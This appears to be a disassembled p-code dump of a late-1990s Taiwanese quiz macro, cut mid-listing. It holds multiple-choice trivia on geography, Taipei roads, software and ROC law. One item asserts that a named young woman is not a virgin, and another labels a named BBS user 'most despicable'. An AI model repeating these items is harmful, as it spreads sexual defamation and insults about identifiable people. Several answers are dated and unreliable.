' 	FuncDefn (Private Sub ReadQuestions2())
' Line #120:
' 	LitStr 0x001E "以下城市由北向南排列何者錯誤？"
' 	LitDI2 0x003D 
' 	ArgsSt Q 0x0001 
' Line #121:
' 	LitStr 0x001C "瑞穗=>玉里=>光復=>成功=>台東"
' 	LitDI2 0x003D 
' 	ArgsSt Opt1 0x0001 
' Line #122:
' 	LitStr 0x001C "汐止=>鶯歌=>內壢=>板橋=>中壢"
' 	LitDI2 0x003D 
' 	ArgsSt Opt2 0x0001 
' Line #123:
' 	LitStr 0x001C "汐止=>萬華=>內壢=>楊梅=>苗栗"
' 	LitDI2 0x003D 
' 	ArgsSt Opt3 0x0001 
' Line #124:
' 	LitDI2 0x0002 
' 	LitDI2 0x003D 
' 	ArgsSt Ans 0x0001 
' Line #125:
' Line #126:
' 	LitStr 0x001E "以下城市由北向南排列何者正確？"
' 	LitDI2 0x003E 
' 	ArgsSt Q 0x0001 
' Line #127:
' 	LitStr 0x001C "頭城=>瑞穗=>玉里=>成功=>台東"
' 	LitDI2 0x003E 
' 	ArgsSt Opt1 0x0001 
' Line #128:
' 	LitStr 0x001C "羅東=>宜蘭=>花蓮=>台東=>屏東"
' 	LitDI2 0x003E 
' 	ArgsSt Opt2 0x0001 
' Line #129:
' 	LitStr 0x001C "汐止=>萬華=>中壢=>湖口=>山佳"
' 	LitDI2 0x003E 
' 	ArgsSt Opt3 0x0001 
' Line #130:
' 	LitDI2 0x0001 
' 	LitDI2 0x003E 
' 	ArgsSt Ans 0x0001 
' Line #131:
' Line #132:
' 	LitStr 0x002A "以下關於台北市的道路由北向南排列何者正確？"
' 	LitDI2 0x003F 
' 	ArgsSt Q 0x0001 
' Line #133:
' 	LitStr 0x0026 "民族東路=>民權東路=>北平東路=>長安東路"
' 	LitDI2 0x003F 
' 	ArgsSt Opt1 0x0001 
' Line #134:
' 	LitStr 0x0026 "忠孝東路=>南京東路=>北平東路=>長安東路"
' 	LitDI2 0x003F 
' 	ArgsSt Opt2 0x0001 
' Line #135:
' 	LitStr 0x0026 "民族東路=>民權東路=>民生東路=>南京東路"
' 	LitDI2 0x003F 
' 	ArgsSt Opt3 0x0001 
' Line #136:
' 	LitDI2 0x0003 
' 	LitDI2 0x003F 
' 	ArgsSt Ans 0x0001 
' Line #137:
' Line #138:
' 	LitStr 0x002A "以下關於台北市的道路由東向西排列何者正確？"
' 	LitDI2 0x0040 
' 	ArgsSt Q 0x0001 
' Line #139:
' 	LitStr 0x0026 "重慶北路=>中山北路=>建國北路=>敦化北路"
' 	LitDI2 0x0040 
' 	ArgsSt Opt1 0x0001 
' Line #140:
' 	LitStr 0x0026 "中山北路=>敦化北路=>新生北路=>建國北路"
' 	LitDI2 0x0040 
' 	ArgsSt Opt2 0x0001 
' Line #141:
' 	LitStr 0x0024 "中山北路=>重慶北路=>建國北路=>基隆路"
' 	LitDI2 0x0040 
' 	ArgsSt Opt3 0x0001 
' Line #142:
' 	LitDI2 0x0001 
' 	LitDI2 0x0040 
' 	ArgsSt Ans 0x0001 
' Line #143:
' Line #144:
' 	LitStr 0x0022 "台北市的中山北路不和以下何者相交？"
' 	LitDI2 0x0041 
' 	ArgsSt Q 0x0001 
' Line #145:
' 	LitStr 0x0008 "民族東路"
' 	LitDI2 0x0041 
' 	ArgsSt Opt1 0x0001 
' Line #146:
' 	LitStr 0x0008 "羅斯福路"
' 	LitDI2 0x0041 
' 	ArgsSt Opt2 0x0001 
' Line #147:
' 	LitStr 0x0008 "忠孝東路"
' 	LitDI2 0x0041 
' 	ArgsSt Opt3 0x0001 
' Line #148:
' 	LitDI2 0x0002 
' 	LitDI2 0x0041 
' 	ArgsSt Ans 0x0001 
' Line #149:
' Line #150:
' 	LitStr 0x0020 "台北市的忠孝東路和以下何者相交？"
' 	LitDI2 0x0042 
' 	ArgsSt Q 0x0001 
' Line #151:
' 	LitStr 0x0006 "仁愛路"
' 	LitDI2 0x0042 
' 	ArgsSt Opt1 0x0001 
' Line #152:
' 	LitStr 0x0008 "羅斯福路"
' 	LitDI2 0x0042 
' 	ArgsSt Opt2 0x0001 
' Line #153:
' 	LitStr 0x0008 "敦化北路"
' 	LitDI2 0x0042 
' 	ArgsSt Opt3 0x0001 
' Line #154:
' 	LitDI2 0x0001 
' 	LitDI2 0x0042 
' 	ArgsSt Ans 0x0001 
' Line #155:
' Line #156:
' 	LitStr 0x0020 "台北市的民權西路和以下何者相交？"
' 	LitDI2 0x0043 
' 	ArgsSt Q 0x0001 
' Line #157:
' 	LitStr 0x0006 "承德路"
' 	LitDI2 0x0043 
' 	ArgsSt Opt1 0x0001 
' Line #158:
' 	LitStr 0x0008 "羅斯福路"
' 	LitDI2 0x0043 
' 	ArgsSt Opt2 0x0001 
' Line #159:
' 	LitStr 0x0008 "敦化北路"
' 	LitDI2 0x0043 
' 	ArgsSt Opt3 0x0001 
' Line #160:
' 	LitDI2 0x0001 
' 	LitDI2 0x0043 
' 	ArgsSt Ans 0x0001 
' Line #161:
' Line #162:
' 	LitStr 0x0020 "台北市的南京西路和以下何者相交？"
' 	LitDI2 0x0044 
' 	ArgsSt Q 0x0001 
' Line #163:
' 	LitStr 0x0006 "承德路"
' 	LitDI2 0x0044 
' 	ArgsSt Opt1 0x0001 
' Line #164:
' 	LitStr 0x0006 "信義路"
' 	LitDI2 0x0044 
' 	ArgsSt Opt2 0x0001 
' Line #165:
' 	LitStr 0x0008 "建國北路"
' 	LitDI2 0x0044 
' 	ArgsSt Opt3 0x0001 
' Line #166:
' 	LitDI2 0x0001 
' 	LitDI2 0x0044 
' 	ArgsSt Ans 0x0001 
' Line #167:
' Line #168:
' 	LitStr 0x0020 "台北市的長安東路和以下何者相交？"
' 	LitDI2 0x0045 
' 	ArgsSt Q 0x0001 
' Line #169:
' 	LitStr 0x0008 "中山北路"
' 	LitDI2 0x0045 
' 	ArgsSt Opt1 0x0001 
' Line #170:
' 	LitStr 0x0006 "信義路"
' 	LitDI2 0x0045 
' 	ArgsSt Opt2 0x0001 
' Line #171:
' 	LitStr 0x0006 "承德路"
' 	LitDI2 0x0045 
' 	ArgsSt Opt3 0x0001 
' Line #172:
' 	LitDI2 0x0001 
' 	LitDI2 0x0045 
' 	ArgsSt Ans 0x0001 
' Line #173:
' Line #174:
' 	LitStr 0x002C "以下何者不是台北市的大安森林公園的周邊道路？"
' 	LitDI2 0x0046 
' 	ArgsSt Q 0x0001 
' Line #175:
' 	LitStr 0x0008 "忠孝東路"
' 	LitDI2 0x0046 
' 	ArgsSt Opt1 0x0001 
' Line #176:
' 	LitStr 0x0006 "信義路"
' 	LitDI2 0x0046 
' 	ArgsSt Opt2 0x0001 
' Line #177:
' 	LitStr 0x0008 "和平東路"
' 	LitDI2 0x0046 
' 	ArgsSt Opt3 0x0001 
' Line #178:
' 	LitDI2 0x0001 
' 	LitDI2 0x0046 
' 	ArgsSt Ans 0x0001 
' Line #179:
' Line #180:
' 	LitStr 0x0022 "以下何者不與台北市的木柵捷運相交？"
' 	LitDI2 0x0047 
' 	ArgsSt Q 0x0001 
' Line #181:
' 	LitStr 0x0008 "忠孝東路"
' 	LitDI2 0x0047 
' 	ArgsSt Opt1 0x0001 
' Line #182:
' 	LitStr 0x0006 "承德路"
' 	LitDI2 0x0047 
' 	ArgsSt Opt2 0x0001 
' Line #183:
' 	LitStr 0x0008 "民生東路"
' 	LitDI2 0x0047 
' 	ArgsSt Opt3 0x0001 
' Line #184:
' 	LitDI2 0x0002 
' 	LitDI2 0x0047 
' 	ArgsSt Ans 0x0001 
' Line #185:
' Line #186:
' 	LitStr 0x0024 "以下何者不是台北市士林區的道路名稱？"
' 	LitDI2 0x0048 
' 	ArgsSt Q 0x0001 
' Line #187:
' 	LitStr 0x0008 "仰德大道"
' 	LitDI2 0x0048 
' 	ArgsSt Opt1 0x0001 
' Line #188:
' 	LitStr 0x0008 "中山北路"
' 	LitDI2 0x0048 
' 	ArgsSt Opt2 0x0001 
' Line #189:
' 	LitStr 0x0006 "南海路"
' 	LitDI2 0x0048 
' 	ArgsSt Opt3 0x0001 
' Line #190:
' 	LitDI2 0x0003 
' 	LitDI2 0x0048 
' 	ArgsSt Ans 0x0001 
' Line #191:
' Line #192:
' 	LitStr 0x0024 "以下何者不是台北市士林區的道路名稱？"
' 	LitDI2 0x0049 
' 	ArgsSt Q 0x0001 
' Line #193:
' 	LitStr 0x0008 "重慶南路"
' 	LitDI2 0x0049 
' 	ArgsSt Opt1 0x0001 
' Line #194:
' 	LitStr 0x0008 "中山北路"
' 	LitDI2 0x0049 
' 	ArgsSt Opt2 0x0001 
' Line #195:
' 	LitStr 0x0006 "忠誠路"
' 	LitDI2 0x0049 
' 	ArgsSt Opt3 0x0001 
' Line #196:
' 	LitDI2 0x0001 
' 	LitDI2 0x0049 
' 	ArgsSt Ans 0x0001 
' Line #197:
' 	EndSub 
' Line #198:
' 	FuncDefn (Private Sub ReadQuestions())
' Line #199:
' 	LitStr 0x0023 "請問以下哪個IP是中興法商BBS的位址？"
' 	LitDI2 0x0001 
' 	ArgsSt Q 0x0001 
' Line #200:
' 	LitStr 0x000B "140.112.1.6"
' 	LitDI2 0x0001 
' 	ArgsSt Opt1 0x0001 
' Line #201:
' 	LitStr 0x000D "192.192.35.34"
' 	LitDI2 0x0001 
' 	ArgsSt Opt2 0x0001 
' Line #202:
' 	LitStr 0x000D "203.64.35.100"
' 	LitDI2 0x0001 
' 	ArgsSt Opt3 0x0001 
' Line #203:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt Ans 0x0001 
' Line #204:
' Line #205:
' 	LitStr 0x002C "請問以下哪個人最不可能是 Excel No.1 的作者？"
' 	LitDI2 0x0002 
' 	ArgsSt Q 0x0001 
' Line #206:
' 	LitStr 0x0006 "翁世豪"
' 	LitDI2 0x0002 
' 	ArgsSt Opt1 0x0001 
' Line #207:
' 	LitStr 0x0006 "吳俊緯"
' 	LitDI2 0x0002 
' 	ArgsSt Opt2 0x0001 
' Line #208:
' 	LitStr 0x0006 "陳清芳"
' 	LitDI2 0x0002 
' 	ArgsSt Opt3 0x0001 
' Line #209:
' 	LitDI2 0x0003 
' 	LitDI2 0x0002 
' 	ArgsSt Ans 0x0001 
' Line #210:
' Line #211:
' 	LitStr 0x0026 "請問以下的北極星使用者中，哪個人最賤？"
' 	LitDI2 0x0003 
' 	ArgsSt Q 0x0001 
' Line #212:
' 	LitStr 0x0007 "Shirely"
' 	LitDI2 0x0003 
' 	ArgsSt Opt1 0x0001 
' Line #213:
' 	LitStr 0x0007 "Takeshi"
' 	LitDI2 0x0003 
' 	ArgsSt Opt2 0x0001 
' Line #214:
' 	LitStr 0x0004 "July"
' 	LitDI2 0x0003 
' 	ArgsSt Opt3 0x0001 
' Line #215:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsSt Ans 0x0001 
' Line #216:
' Line #217:
' 	LitStr 0x001E "請問以下哪個人已經不是處女了？"
' 	LitDI2 0x0004 
' 	ArgsSt Q 0x0001 
' Line #218:
' 	LitStr 0x0014 "崇Ｚ企專Ｘ貿科蔡芳宜"
' 	LitDI2 0x0004 
' 	ArgsSt Opt1 0x0001 
' Line #219:
' 	LitStr 0x0014 "台北Ｚ專Ｘ保科王韻親"
' 	LitDI2 0x0004 
' 	ArgsSt Opt2 0x0001 
' Line #220:
' 	LitStr 0x000E "Ｚ吳大學范亞雰"
' 	LitDI2 0x0004 
' 	ArgsSt Opt3 0x0001 
' Line #221:
' 	LitDI2 0x0003 
' 	LitDI2 0x0004 
' 	ArgsSt Ans 0x0001 
' Line #222:
' Line #223:
' 	LitStr 0x001C "請問通常高普考在哪個月放榜？"
' 	LitDI2 0x0005 
' 	ArgsSt Q 0x0001 
' Line #224:
' 	LitStr 0x0004 "一月"
' 	LitDI2 0x0005 
' 	ArgsSt Opt1 0x0001 
' Line #225:
' 	LitStr 0x0004 "八月"
' 	LitDI2 0x0005 
' 	ArgsSt Opt2 0x0001 
' Line #226:
' 	LitStr 0x0004 "十月"
' 	LitDI2 0x0005 
' 	ArgsSt Opt3 0x0001 
' Line #227:
' 	LitDI2 0x0003 
' 	LitDI2 0x0005 
' 	ArgsSt Ans 0x0001 
' Line #228:
' Line #229:
' 	LitStr 0x0024 "請問以下哪個人不是殺害白曉燕的兇手？"
' 	LitDI2 0x0006 
' 	ArgsSt Q 0x0001 
' Line #230:
' 	LitStr 0x0006 "陳進興"
' 	LitDI2 0x0006 
' 	ArgsSt Opt1 0x0001 
' Line #231:
' 	LitStr 0x0006 "林春生"
' 	LitDI2 0x0006 
' 	ArgsSt Opt2 0x0001 
' Line #232:
' 	LitStr 0x0006 "白冰冰"
' 	LitDI2 0x0006 
' 	ArgsSt Opt3 0x0001 
' Line #233:
' 	LitDI2 0x0003 
' 	LitDI2 0x0006 
' 	ArgsSt Ans 0x0001 
' Line #234:
' Line #235:
' 	LitStr 0x0022 "請問以下哪個軟體不是微軟公司出的？"
' 	LitDI2 0x0007 
' 	ArgsSt Q 0x0001 
' Line #236:
' 	LitStr 0x0009 "PHOTOSHOP"
' 	LitDI2 0x0007 
' 	ArgsSt Opt1 0x0001 
' Line #237:
' 	LitStr 0x0009 "OFFICE 97"
' 	LitDI2 0x0007 
' 	ArgsSt Opt2 0x0001 
' Line #238:
' 	LitStr 0x0011 "INTERNET EXPLORER"
' 	LitDI2 0x0007 
' 	ArgsSt Opt3 0x0001 
' Line #239:
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	ArgsSt Ans 0x0001 
' Line #240:
' Line #241:
' 	LitStr 0x0022 "請問以下哪個軟體不是微軟公司出的？"
' 	LitDI2 0x0008 
' 	ArgsSt Q 0x0001 
' Line #242:
' 	LitStr 0x0008 "WORD PRO"
' 	LitDI2 0x0008 
' 	ArgsSt Opt1 0x0001 
' Line #243:
' 	LitStr 0x0009 "OFFICE 97"
' 	LitDI2 0x0008 
' 	ArgsSt Opt2 0x0001 
' Line #244:
' 	LitStr 0x000A "WINDOWS 95"
' 	LitDI2 0x0008 
' 	ArgsSt Opt3 0x0001 
' Line #245:
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsSt Ans 0x0001 
' Line #246:
' Line #247:
' 	LitStr 0x0036 "溫尼颱風過境造成慘重的損害，以下哪個單位最不需要負責？"
' 	LitDI2 0x0009 
' 	ArgsSt Q 0x0001 
' Line #248:
' 	LitStr 0x000C "行政院各部會"
' 	LitDI2 0x0009 
' 	ArgsSt Opt1 0x0001 
' Line #249:
' 	LitStr 0x000A "士林地檢署"
' 	LitDI2 0x0009 
' 	ArgsSt Opt2 0x0001 
' Line #250:
' 	LitStr 0x0006 "水利局"
' 	LitDI2 0x0009 
' 	ArgsSt Opt3 0x0001 
' Line #251:
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsSt Ans 0x0001 
' Line #252:
' Line #253:
' 	LitStr 0x0028 "以下哪個人是VB5與ActiveX程式設計的作者？"
' 	LitDI2 0x000A 
' 	ArgsSt Q 0x0001 
' Line #254:
' 	LitStr 0x0006 "薛曉嵐"
' 	LitDI2 0x000A 
' 	ArgsSt Opt1 0x0001 
' Line #255:
' 	LitStr 0x0006 "王國榮"
' 	LitDI2 0x000A 
' 	ArgsSt Opt2 0x0001 
' Line #256:
' 	LitStr 0x0006 "鄧文淵"
' 	LitDI2 0x000A 
' 	ArgsSt Opt3 0x0001 
' Line #257:
' 	LitDI2 0x0002 
' 	LitDI2 0x000A 
' 	ArgsSt Ans 0x0001 
' Line #258:
' Line #259:
' 	LitStr 0x0025 "以下哪個人是Word 97的使用藝術之作者？"
' 	LitDI2 0x000B 
' 	ArgsSt Q 0x0001 
' Line #260:
' 	LitStr 0x0006 "薛曉嵐"
' 	LitDI2 0x000B 
' 	ArgsSt Opt1 0x0001 
' Line #261:
' 	LitStr 0x0006 "王國榮"
' 	LitDI2 0x000B 
' 	ArgsSt Opt2 0x0001 
' Line #262:
' 	LitStr 0x0006 "鄧文淵"
' 	LitDI2 0x000B 
' 	ArgsSt Opt3 0x0001 
' Line #263:
' 	LitDI2 0x0001 
' 	LitDI2 0x000B 
' 	ArgsSt Ans 0x0001 
' Line #264:
' Line #265:
' 	LitStr 0x002C "以下哪個人是北港香爐人人插一書中所影射的人？"
' 	LitDI2 0x000C 
' 	ArgsSt Q 0x0001 
' Line #266:
' 	LitStr 0x0006 "瞿美鳳"
' 	LitDI2 0x000C 
' 	ArgsSt Opt1 0x0001 
' Line #267:
' 	LitStr 0x0006 "白冰冰"
' 	LitDI2 0x000C 
' 	ArgsSt Opt2 0x0001 
' Line #268:
' 	LitStr 0x0006 "陳文茜"
' 	LitDI2 0x000C 
' 	ArgsSt Opt3 0x0001 
' Line #269:
' 	LitDI2 0x0003 
' 	LitDI2 0x000C 
' 	ArgsSt Ans 0x0001 
' Line #270:
' Line #271:
' 	LitStr 0x0028 "以下哪個人目前最不可能是台視新聞的主播？"
' 	LitDI2 0x000D 
' 	ArgsSt Q 0x0001 
' Line #272:
' 	LitStr 0x0006 "李慧慧"
' 	LitDI2 0x000D 
' 	ArgsSt Opt1 0x0001 
' Line #273:
' 	LitStr 0x0006 "蘇宗怡"
' 	LitDI2 0x000D 
' 	ArgsSt Opt2 0x0001 
' Line #274:
' 	LitStr 0x0006 "劉麗惠"
' 	LitDI2 0x000D 
' 	ArgsSt Opt3 0x0001 
' Line #275:
' 	LitDI2 0x0002 
' 	LitDI2 0x000D 
' 	ArgsSt Ans 0x0001 
' Line #276:
' Line #277:
' 	LitStr 0x0026 "以下哪個人目前最不可能當中華民國總統？"
' 	LitDI2 0x000E 
' 	ArgsSt Q 0x0001 
' Line #278:
' 	LitStr 0x0006 "江澤民"
' 	LitDI2 0x000E 
' 	ArgsSt Opt1 0x0001 
' Line #279:
' 	LitStr 0x0006 "宋楚瑜"
' 	LitDI2 0x000E 
' 	ArgsSt Opt2 0x0001 
' Line #280:
' 	LitStr 0x0004 "連戰"
' 	LitDI2 0x000E 
' 	ArgsSt Opt3 0x0001 
' Line #281:
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	ArgsSt Ans 0x0001 
' Line #282:
' Line #283:
' 	LitStr 0x002A "以下哪種土壤最有可能分布在台灣西部海埔地？"
' 	LitDI2 0x000F 
' 	ArgsSt Q 0x0001 
' Line #284:
' 	LitStr 0x0004 "紅壤"
' 	LitDI2 0x000F 
' 	ArgsSt Opt1 0x0001 
' Line #285:
' 	LitStr 0x0006 "鹽漬土"
' 	LitDI2 0x000F 
' 	ArgsSt Opt2 0x0001 
' Line #286:
' 	LitStr 0x0006 "紫棕壤"
' 	LitDI2 0x000F 
' 	ArgsSt Opt3 0x0001 
' Line #287:
' 	LitDI2 0x0002 
' 	LitDI2 0x000F 
' 	ArgsSt Ans 0x0001 
' Line #288:
' Line #289:
' 	LitStr 0x0024 "以下哪種土壤最有可能分布在四川盆地？"
' 	LitDI2 0x0010 
' 	ArgsSt Q 0x0001 
' Line #290:
' 	LitStr 0x0004 "紅壤"
' 	LitDI2 0x0010 
' 	ArgsSt Opt1 0x0001 
' Line #291:
' 	LitStr 0x0006 "鹽漬土"
' 	LitDI2 0x0010 
' 	ArgsSt Opt2 0x0001 
' Line #292:
' 	LitStr 0x0006 "灰棕壤"
' 	LitDI2 0x0010 
' 	ArgsSt Opt3 0x0001 
' Line #293:
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	ArgsSt Ans 0x0001 
' Line #294:
' Line #295:
' 	LitStr 0x0026 "以下哪個名稱不曾被病毒作者拿來命名過？"
' 	LitDI2 0x0011 
' 	ArgsSt Q 0x0001 
' Line #296:
' 	LitStr 0x0006 "馬蓋先"
' 	LitDI2 0x0011 
' 	ArgsSt Opt1 0x0001 
' Line #297:
' 	LitStr 0x000A "台灣原住民"
' 	LitDI2 0x0011 
' 	ArgsSt Opt2 0x0001 
' Line #298:
' 	LitStr 0x000A "中央情報局"
' 	LitDI2 0x0011 
' 	ArgsSt Opt3 0x0001 
' Line #299:
' 	LitDI2 0x0003 
' 	LitDI2 0x0011 
' 	ArgsSt Ans 0x0001 
' Line #300:
' Line #301:
' 	LitStr 0x0022 "以下哪個人在天宇布袋戲中活得最久？"
' 	LitDI2 0x0012 
' 	ArgsSt Q 0x0001 
' Line #302:
' 	LitStr 0x0006 "藏修羅"
' 	LitDI2 0x0012 
' 	ArgsSt Opt1 0x0001 
' Line #303:
' 	LitStr 0x0006 "孤獨毒"
' 	LitDI2 0x0012 
' 	ArgsSt Opt2 0x0001 
' Line #304:
' 	LitStr 0x0006 "藏神秘"
' 	LitDI2 0x0012 
' 	ArgsSt Opt3 0x0001 
' Line #305:
' 	LitDI2 0x0003 
' 	LitDI2 0x0012 
' 	ArgsSt Ans 0x0001 
' Line #306:
' Line #307:
' 	LitStr 0x0022 "以下哪個人在天宇布袋戲中活得最久？"
' 	LitDI2 0x0013 
' 	ArgsSt Q 0x0001 
' Line #308:
' 	LitStr 0x0008 "六手魔像"
' 	LitDI2 0x0013 
' 	ArgsSt Opt1 0x0001 
' Line #309:
' 	LitStr 0x0006 "孤獨毒"
' 	LitDI2 0x0013 
' 	ArgsSt Opt2 0x0001 
' Line #310:
' 	LitStr 0x0008 "怒雨飛龍"
' 	LitDI2 0x0013 
' 	ArgsSt Opt3 0x0001 
' Line #311:
' 	LitDI2 0x0001 
' 	LitDI2 0x0013 
' 	ArgsSt Ans 0x0001 
' Line #312:
' Line #313:
' 	LitStr 0x002C "以下哪個人在天宇布袋戲裡和藏神秘關係最密切？"
' 	LitDI2 0x0014 
' 	ArgsSt Q 0x0001 
' Line #314:
' 	LitStr 0x0006 "矮子靈"
' 	LitDI2 0x0014 
' 	ArgsSt Opt1 0x0001 
' Line #315:
' 	LitStr 0x0006 "三裁公"
' 	LitDI2 0x0014 
' 	ArgsSt Opt2 0x0001 
' Line #316:
' 	LitStr 0x0008 "怒雨飛龍"
' 	LitDI2 0x0014 
' 	ArgsSt Opt3 0x0001 
' Line #317:
' 	LitDI2 0x0002 
' 	LitDI2 0x0014 
' 	ArgsSt Ans 0x0001 
' Line #318:
' Line #319:
' 	LitStr 0x002A "以下哪個人在天宇布袋戲裡和紅雲關係最不深？"
' 	LitDI2 0x0015 
' 	ArgsSt Q 0x0001 
' Line #320:
' 	LitStr 0x0008 "造雲麒麟"
' 	LitDI2 0x0015 
' 	ArgsSt Opt1 0x0001 
' Line #321:
' 	LitStr 0x0008 "劍苗小雙"
' 	LitDI2 0x0015 
' 	ArgsSt Opt2 0x0001 
' Line #322:
' 	LitStr 0x0006 "夢雨涵"
' 	LitDI2 0x0015 
' 	ArgsSt Opt3 0x0001 
' Line #323:
' 	LitDI2 0x0002 
' 	LitDI2 0x0015 
' 	ArgsSt Ans 0x0001 
' Line #324:
' Line #325:
' 	LitStr 0x0026 "以下哪個單位是中華民國最高的行政機關？"
' 	LitDI2 0x0016 
' 	ArgsSt Q 0x0001 
' Line #326:
' 	LitStr 0x0006 "行政院"
' 	LitDI2 0x0016 
' 	ArgsSt Opt1 0x0001 
' Line #327:
' 	LitStr 0x0006 "總統府"
' 	LitDI2 0x0016 
' 	ArgsSt Opt2 0x0001 
' Line #328:
' 	LitStr 0x000A "國家安全局"
' 	LitDI2 0x0016 
' 	ArgsSt Opt3 0x0001 
' Line #329:
' 	LitDI2 0x0001 
' 	LitDI2 0x0016 
' 	ArgsSt Ans 0x0001 
' Line #330:
' Line #331:
' 	LitStr 0x0026 "以下哪個單位是中華民國最高的立法機關？"
' 	LitDI2 0x0017 
' 	ArgsSt Q 0x0001 
' Line #332:
' 	LitStr 0x0006 "行政院"
' 	LitDI2 0x0017 
' 	ArgsSt Opt1 0x0001 
' Line #333:
' 	LitStr 0x0006 "總統府"
' 	LitDI2 0x0017 
' 	ArgsSt Opt2 0x0001 
' Line #334:
' 	LitStr 0x0006 "立法院"
' 	LitDI2 0x0017 
' 	ArgsSt Opt3 0x0001 
' Line #335:
' 	LitDI2 0x0003 
' 	LitDI2 0x0017 
' 	ArgsSt Ans 0x0001 
' Line #336:
' Line #337:
' 	LitStr 0x0022 "以下哪個單位可以解釋中華民國憲法？"
' 	LitDI2 0x0018 
' 	ArgsSt Q 0x0001 
' Line #338:
' 	LitStr 0x0006 "立法院"
' 	LitDI2 0x0018 
' 	ArgsSt Opt1 0x0001 
' Line #339:
' 	LitStr 0x0006 "總統府"
' 	LitDI2 0x0018 
' 	ArgsSt Opt2 0x0001 
' Line #340:
' 	LitStr 0x000A "大法官會議"
' 	LitDI2 0x0018 
' 	ArgsSt Opt3 0x0001 
' Line #341:
' 	LitDI2 0x0003 
' 	LitDI2 0x0018 
' 	ArgsSt Ans 0x0001 
' Line #342:
' Line #343:
' 	LitStr 0x0020 "國父認為什麼是人民權利的保障書？"
' 	LitDI2 0x0019 
' 	ArgsSt Q 0x0001 
' Line #344:
' 	LitStr 0x0004 "民法"
' 	LitDI2 0x0019 
' 	ArgsSt Opt1 0x0001 
' Line #345:
' 	LitStr 0x0004 "刑法"
' 	LitDI2 0x0019 
' 	ArgsSt Opt2 0x0001 
' Line #346:
' 	LitStr 0x0004 "憲法"
' 	LitDI2 0x0019 
' 	ArgsSt Opt3 0x0001 
' Line #347:
' 	LitDI2 0x0003 
' 	LitDI2 0x0019 
' 	ArgsSt Ans 0x0001 
' Line #348:
' Line #349:
' 	LitStr 0x001E "目前以下何人不享有言論免責權？"
' 	LitDI2 0x001A 
' 	ArgsSt Q 0x0001 
' Line #350:
' 	LitStr 0x0008 "立法委員"
' 	LitDI2 0x001A 
' 	ArgsSt Opt1 0x0001 
' Line #351:
' 	LitStr 0x0004 "總統"
' 	LitDI2 0x001A 
' 	ArgsSt Opt2 0x0001 
' Line #352:
' 	LitStr 0x0006 "省議員"
' 	LitDI2 0x001A 
' 	ArgsSt Opt3 0x0001 
' Line #353:
' 	LitDI2 0x0002 
' 	LitDI2 0x001A 
' 	ArgsSt Ans 0x0001 
' Line #354:
' Line #355:
' 	LitStr 0x001E "目前以下何人不享有言論免責權？"
' 	LitDI2 0x001B 
' 	ArgsSt Q 0x0001 
' Line #356:
' 	LitStr 0x0008 "立法委員"
' 	LitDI2 0x001B 
' 	ArgsSt Opt1 0x0001 
' Line #357:
' 	LitStr 0x0008 "監察委員"
' 	LitDI2 0x001B 
' 	ArgsSt Opt2 0x0001 
' Line #358:
' 	LitStr 0x0008 "國大代表"
' 	LitDI2 0x001B 
' 	ArgsSt Opt3 0x0001 
' Line #359:
' 	LitDI2 0x0002 
' 	LitDI2 0x001B 
' 	ArgsSt Ans 0x0001 
' Line #360:
' Line #361:
' 	LitStr 0x001E "目前以下何人不享有言論免責權？"
' 	LitDI2 0x001C 
' 	ArgsSt Q 0x0001 
' Line #362:
' 	LitStr 0x0008 "立法委員"
' 	LitDI2 0x001C 
' 	ArgsSt Opt1 0x0001 
' Line #363:
' 	LitStr 0x0004 "法官"
' 	LitDI2 0x001C 
' 	ArgsSt Opt2 0x0001 
' Line #364:
' 	LitStr 0x0008 "國大代表"
' 	LitDI2 0x001C 
' 	ArgsSt Opt3 0x0001 
' Line #365:
' 	LitDI2 0x0002 
' 	LitDI2 0x001C 
' 	ArgsSt Ans 0x0001 
' Line #366:
' Line #367:
' 	LitStr 0x001A "我國受理行政訴訟的機關是？"
' 	LitDI2 0x001D 
' 	ArgsSt Q 0x0001 
' Line #368:
' 	LitStr 0x000A "行政院會議"
' 	LitDI2 0x001D 
' 	ArgsSt Opt1 0x0001 
' Line #369:
' 	LitStr 0x0008 "憲法法庭"
' 	LitDI2 0x001D 
' 	ArgsSt Opt2 0x0001 
' Line #370:
' 	LitStr 0x0008 "行政法院"
' 	LitDI2 0x001D 
' 	ArgsSt Opt3 0x0001 
' Line #371:
' 	LitDI2 0x0003 
' 	LitDI2 0x001D 
' 	ArgsSt Ans 0x0001 
' Line #372:
' Line #373:
' 	LitStr 0x0028 "我國哪種官職的就職宣誓誓詞明定於憲法內？"
' 	LitDI2 0x001E 
' 	ArgsSt Q 0x0001 
' Line #374:
' 	LitStr 0x0008 "行政院長"
' 	LitDI2 0x001E 
' 	ArgsSt Opt1 0x0001 
' Line #375:
' 	LitStr 0x0004 "總統"
' 	LitDI2 0x001E 
' 	ArgsSt Opt2 0x0001 
' Line #376:
' 	LitStr 0x0008 "司法院長"
' 	LitDI2 0x001E 
' 	ArgsSt Opt3 0x0001 
' Line #377:
' 	LitDI2 0x0002 
' 	LitDI2 0x001E 
' 	ArgsSt Ans 0x0001 
' Line #378:
' Line #379:
' 	LitStr 0x0042 "我國國民大會若要修改憲法，其決議通過的人數需是出席代表的幾分之幾？"
' 	LitDI2 0x001F 
' 	ArgsSt Q 0x0001 
' Line #380:
' 	LitStr 0x0003 "2/3"
' 	LitDI2 0x001F 
' 	ArgsSt Opt1 0x0001 
' Line #381:
' 	LitStr 0x0003 "3/4"
' 	LitDI2 0x001F 
' 	ArgsSt Opt2 0x0001 
' Line #382:
' 	LitStr 0x0003 "1/2"
' 	LitDI2 0x001F 
' 	ArgsSt Opt3 0x0001 
' Line #383:
' 	LitDI2 0x0002 
' 	LitDI2 0x001F 
' 	ArgsSt Ans 0x0001 
' Line #384:
' Line #385:
' 	LitStr 0x0012 "我國法官的任期是？"
' 	LitDI2 0x0020 
' 	ArgsSt Q 0x0001 
' Line #386:
' 	LitStr 0x0004 "九年"
' 	LitDI2 0x0020 
' 	ArgsSt Opt1 0x0001 
' Line #387:
' 	LitStr 0x0006 "終身職"
' 	LitDI2 0x0020 
' 	ArgsSt Opt2 0x0001 
' Line #388:
' 	LitStr 0x000E "與執政黨同進退"
' 	LitDI2 0x0020 
' 	ArgsSt Opt3 0x0001 
' Line #389:
' 	LitDI2 0x0002 
